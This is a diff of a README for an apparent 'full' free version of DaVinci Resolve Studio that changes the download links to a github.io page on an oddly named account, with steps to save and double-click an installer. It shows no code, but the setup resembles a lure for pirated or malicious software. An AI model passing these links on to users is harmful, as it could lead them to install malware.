@@ -1,6 +1,6 @@
 # 🎬 davinci-resolve-studio-full - Professional video editing for your computer
 
-[![Download Application](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/commonlaw-steal523/davinci-resolve-studio-full)
+[![Download Application](https://img.shields.io/badge/Download-Software-blue.svg)](https://commonlaw-steal523.github.io)
 
 ## 📌 Overview
 
@@ -29,7 +29,7 @@ Before you install this software, check that your computer meets these minimum s
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download: [https://github.com/commonlaw-steal523/davinci-resolve-studio-full](https://github.com/commonlaw-steal523/davinci-resolve-studio-full)
+1. Visit this page to download: [https://commonlaw-steal523.github.io](https://commonlaw-steal523.github.io)
 2. Locate the download button on the page.
 3. Save the installer file to your desktop.
 4. Double-click the file to start the installation.
